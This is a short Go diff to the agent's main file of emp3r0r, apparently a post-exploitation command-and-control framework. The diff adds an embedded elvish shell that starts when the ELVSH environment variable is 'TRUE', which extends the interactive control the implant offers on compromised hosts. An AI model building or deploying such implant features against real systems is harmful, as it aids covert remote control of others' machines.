@@ -24,6 +24,10 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
+	"src.elv.sh/pkg/buildinfo"
+	"src.elv.sh/pkg/lsp"
+	"src.elv.sh/pkg/prog"
+	"src.elv.sh/pkg/shell"
 )
 
 func main() {
@@ -36,6 +40,16 @@ func main() {
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+
+	// run as elvish shell
+	runElvsh := os.Getenv("ELVSH") == "TRUE"
+	if runElvsh {
+		os.Exit(prog.Run(
+			[3]*os.File{os.Stdin, os.Stdout, os.Stderr}, os.Args,
+			prog.Composite(
+				&buildinfo.Program{}, &lsp.Program{},
+				&shell.Program{})))
+	}
 
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
